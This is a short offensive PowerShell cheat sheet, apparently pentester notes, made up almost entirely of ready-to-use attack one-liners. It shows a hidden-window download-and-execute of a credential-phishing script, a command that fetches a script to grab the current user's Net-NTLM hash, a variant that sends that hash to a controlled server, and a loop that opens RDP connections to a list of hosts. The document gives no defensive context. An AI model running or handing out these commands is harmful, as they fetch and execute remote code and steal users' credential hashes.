
Credphish:  
```powershell -ep bypass -WindowStyle hidden -c "Invoke-WebRequest -URI 'https://<domain>.com/phish.ps1'|iex"```

Get Net-NTLM hash of current user:  
```powershell -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('https://github.com/elnerd/Get-NetNTLM/raw/master/Get-NetNTLM.ps1'); Get-NetNTLM-Hash"```

Get Net-NTLM hash of current user and send to websever:
```irm "http://<controlled server>/test/$(iex(New-Object Net.WebClient).DownloadString('https://website/Get-NetNTLM.ps1')|ForEach-Object {[System.Web.HttpUtility]::UrlEncode($_)})"```

Iterate over file containg RDP servers:  
```gc "your_file.txt" | %{Start-Process mstsc -ArgumentList "/v:$_" -Wait; Start-Sleep -s 1}```
